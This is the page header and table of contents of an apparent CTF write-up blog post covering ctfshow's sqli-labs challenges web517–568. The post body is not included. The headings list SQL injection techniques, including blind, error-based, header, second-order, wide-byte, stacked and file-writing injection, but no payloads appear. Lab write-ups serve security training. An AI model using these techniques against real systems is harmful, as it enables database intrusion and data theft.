<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta name="description" content="ctfshow入门sqli-labs">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow入门sqli-labs">
<meta property="og:url" content="https://wanth3f1ag.top/2025/06/04/ctfshow%E5%85%A5%E9%97%A8sqli-labs(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="ctfshow入门sqli-labs">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604100020624.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604102846076.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604103543081.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604103742163.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604130047877.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604142949157.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604142053653.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604142022998.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604150659330.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604152356237.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604153215767.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604154453790.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604155223814.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604160309527.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604160613676.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604161505213.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604165535512.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250605105502016.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250605105758882.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250605110119877.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250605121347058.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250605182533287.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250605192659763.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250605193039640.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250605193055295.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250605193335124.png">
<meta property="article:published_time" content="2025-06-04T01:29:03.000Z">
<meta property="article:modified_time" content="2025-12-01T11:20:14.289Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="sqli-labs">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/sqli-labs/image-20250604100020624.png">


<link rel="canonical" href="https://wanth3f1ag.top/2025/06/04/ctfshow%E5%85%A5%E9%97%A8sqli-labs(%E5%B7%B2%E5%81%9A%E5%AE%8C)/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/06/04/ctfshow%E5%85%A5%E9%97%A8sqli-labs(%E5%B7%B2%E5%81%9A%E5%AE%8C)/","path":"2025/06/04/ctfshow入门sqli-labs(已做完)/","title":"ctfshow入门sqli-labs"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ctfshow入门sqli-labs | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web517"><span class="nav-number">1.</span> <span class="nav-text">web517</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E5%AD%97%E7%AC%A6%E5%9E%8Bunion"><span class="nav-number">1.1.</span> <span class="nav-text">#GET字符型union</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web518"><span class="nav-number">2.</span> <span class="nav-text">web518</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E6%95%B0%E5%AD%97%E5%9E%8Bunion"><span class="nav-number">2.1.</span> <span class="nav-text">#GET数字型union</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web519"><span class="nav-number">3.</span> <span class="nav-text">web519</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7union"><span class="nav-number">3.1.</span> <span class="nav-text">#GET单引号括号union</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web520"><span class="nav-number">4.</span> <span class="nav-text">web520</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7union"><span class="nav-number">4.1.</span> <span class="nav-text">#GET双引号括号union</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web521"><span class="nav-number">5.</span> <span class="nav-text">web521</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%B8%83%E5%B0%94"><span class="nav-number">5.1.</span> <span class="nav-text">#GET单引号布尔</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web522"><span class="nav-number">6.</span> <span class="nav-text">web522</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%B8%83%E5%B0%94"><span class="nav-number">6.1.</span> <span class="nav-text">#GET双引号布尔</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web523"><span class="nav-number">7.</span> <span class="nav-text">web523</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%8C%E6%8B%AC%E5%8F%B7%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">7.1.</span> <span class="nav-text">#GET单引号双括号文件注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web524"><span class="nav-number">8.</span> <span class="nav-text">web524</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%B8%83%E5%B0%94-1"><span class="nav-number">8.1.</span> <span class="nav-text">#GET单引号布尔</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web525"><span class="nav-number">9.</span> <span class="nav-text">web525</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E5%8D%95%E5%BC%95%E5%8F%B7%E6%97%B6%E9%97%B4"><span class="nav-number">9.1.</span> <span class="nav-text">#GET单引号时间</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web526"><span class="nav-number">10.</span> <span class="nav-text">web526</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%97%B6%E9%97%B4"><span class="nav-number">10.1.</span> <span class="nav-text">#GET双引号时间</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web527"><span class="nav-number">11.</span> <span class="nav-text">web527</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E5%AD%97%E7%AC%A6%E5%9E%8Bunion"><span class="nav-number">11.1.</span> <span class="nav-text">#POST字符型union</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web528"><span class="nav-number">12.</span> <span class="nav-text">web528</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7union"><span class="nav-number">12.1.</span> <span class="nav-text">#POST双引号括号union</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web529"><span class="nav-number">13.</span> <span class="nav-text">web529</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="nav-number">13.1.</span> <span class="nav-text">#POST单引号括号盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E8%A7%A3%E7%A0%81%E9%97%AE%E9%A2%98"><span class="nav-number">13.2.</span> <span class="nav-text">#关于解码问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web530"><span class="nav-number">14.</span> <span class="nav-text">web530</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="nav-number">14.1.</span> <span class="nav-text">#POST双引号盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web531"><span class="nav-number">15.</span> <span class="nav-text">web531</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="nav-number">15.1.</span> <span class="nav-text">#POST单引号盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web532"><span class="nav-number">16.</span> <span class="nav-text">web532</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="nav-number">16.1.</span> <span class="nav-text">#POST双引号括号盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web533"><span class="nav-number">17.</span> <span class="nav-text">web533</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">17.1.</span> <span class="nav-text">#报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web534"><span class="nav-number">18.</span> <span class="nav-text">web534</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UA%E5%A4%B4%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">18.1.</span> <span class="nav-text">#UA头单引号报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web535"><span class="nav-number">19.</span> <span class="nav-text">web535</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Rerferer%E5%A4%B4%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">19.1.</span> <span class="nav-text">#Rerferer头单引号报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web536"><span class="nav-number">20.</span> <span class="nav-text">web536</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie%E5%A4%B4%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">20.1.</span> <span class="nav-text">#Cookie头单引号报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web537"><span class="nav-number">21.</span> <span class="nav-text">web537</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie%E5%A4%B4%E5%8D%95%E5%BC%95%E5%8F%B7-%E7%BC%96%E7%A0%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">21.1.</span> <span class="nav-text">#Cookie头单引号+编码报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web538"><span class="nav-number">22.</span> <span class="nav-text">web538</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie%E5%8F%8C%E5%BC%95%E5%8F%B7-%E7%BC%96%E7%A0%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">22.1.</span> <span class="nav-text">#Cookie双引号+编码报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web539"><span class="nav-number">23.</span> <span class="nav-text">web539</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%89%8D%E5%90%8E%E9%97%AD%E5%90%88union"><span class="nav-number">23.1.</span> <span class="nav-text">#单引号前后闭合union</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web540"><span class="nav-number">24.</span> <span class="nav-text">web540</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">24.1.</span> <span class="nav-text">#二次注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web541-542"><span class="nav-number">25.</span> <span class="nav-text">web541&amp;542</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4and%E5%92%8Cor"><span class="nav-number">25.1.</span> <span class="nav-text">#过滤and和or</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web543"><span class="nav-number">26.</span> <span class="nav-text">web543</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4space%E5%92%8C%E6%B3%A8%E9%87%8A"><span class="nav-number">26.1.</span> <span class="nav-text">#增加过滤space和注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web544"><span class="nav-number">27.</span> <span class="nav-text">web544</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4space%E5%92%8C%E6%B3%A8%E9%87%8A-1"><span class="nav-number">27.1.</span> <span class="nav-text">#增加过滤space和注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web545"><span class="nav-number">28.</span> <span class="nav-text">web545</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4union%E5%92%8Cselect"><span class="nav-number">28.1.</span> <span class="nav-text">#单引号增加过滤union和select</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web546"><span class="nav-number">29.</span> <span class="nav-text">web546</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4union%E5%92%8Cselect"><span class="nav-number">29.1.</span> <span class="nav-text">#双引号增加过滤union和select</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web547-548"><span class="nav-number">30.</span> <span class="nav-text">web547&amp;548</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7-%E6%8B%AC%E5%8F%B7%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4union%E5%92%8Cselect"><span class="nav-number">30.1.</span> <span class="nav-text">#单引号+括号增加过滤union和select</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web549"><span class="nav-number">31.</span> <span class="nav-text">web549</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7-Http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">31.1.</span> <span class="nav-text">#单引号+Http参数污染</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web550"><span class="nav-number">32.</span> <span class="nav-text">web550</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7-Http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">32.1.</span> <span class="nav-text">#双引号+Http参数污染</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web551"><span class="nav-number">33.</span> <span class="nav-text">web551</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7-Http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">33.1.</span> <span class="nav-text">#双引号括号+Http参数污染</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web552"><span class="nav-number">34.</span> <span class="nav-text">web552</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A51"><span class="nav-number">34.1.</span> <span class="nav-text">#单引号宽字节注入1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web553"><span class="nav-number">35.</span> <span class="nav-text">web553</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#addslashes%E5%AE%BD%E5%AD%97%E8%8A%82GET"><span class="nav-number">35.1.</span> <span class="nav-text">#addslashes宽字节GET</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web554"><span class="nav-number">36.</span> <span class="nav-text">web554</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#addslashes%E5%AE%BD%E5%AD%97%E8%8A%82POST"><span class="nav-number">36.1.</span> <span class="nav-text">#addslashes宽字节POST</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web555"><span class="nav-number">37.</span> <span class="nav-text">web555</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">37.1.</span> <span class="nav-text">#数字型的注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web556"><span class="nav-number">38.</span> <span class="nav-text">web556</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-real-escape-string%E5%AE%BD%E5%AD%97%E8%8A%82GET"><span class="nav-number">38.1.</span> <span class="nav-text">#mysql_real_escape_string宽字节GET</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web557"><span class="nav-number">39.</span> <span class="nav-text">web557</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-real-escape-string%E5%AE%BD%E5%AD%97%E8%8A%82POST"><span class="nav-number">39.1.</span> <span class="nav-text">#mysql_real_escape_string宽字节POST</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web558"><span class="nav-number">40.</span> <span class="nav-text">web558</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">40.1.</span> <span class="nav-text">#堆叠注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web559"><span class="nav-number">41.</span> <span class="nav-text">web559</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">41.1.</span> <span class="nav-text">#数字型联合注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web560"><span class="nav-number">42.</span> <span class="nav-text">web560</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">42.1.</span> <span class="nav-text">#单引号括号联合注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web561"><span class="nav-number">43.</span> <span class="nav-text">web561</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web562"><span class="nav-number">44.</span> <span class="nav-text">web562</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">44.1.</span> <span class="nav-text">#POST单引号报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web563"><span class="nav-number">45.</span> <span class="nav-text">web563</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">45.1.</span> <span class="nav-text">#POST单引号括号报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web564"><span class="nav-number">46.</span> <span class="nav-text">web564</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">46.1.</span> <span class="nav-text">#order by报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web565"><span class="nav-number">47.</span> <span class="nav-text">web565</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7-order-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">47.1.</span> <span class="nav-text">#单引号 order by报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web566"><span class="nav-number">48.</span> <span class="nav-text">web566</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="nav-number">48.1.</span> <span class="nav-text">#order by盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web567"><span class="nav-number">49.</span> <span class="nav-text">web567</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by-%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">49.1.</span> <span class="nav-text">#order by 写文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web568"><span class="nav-number">50.</span> <span class="nav-text">web568</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 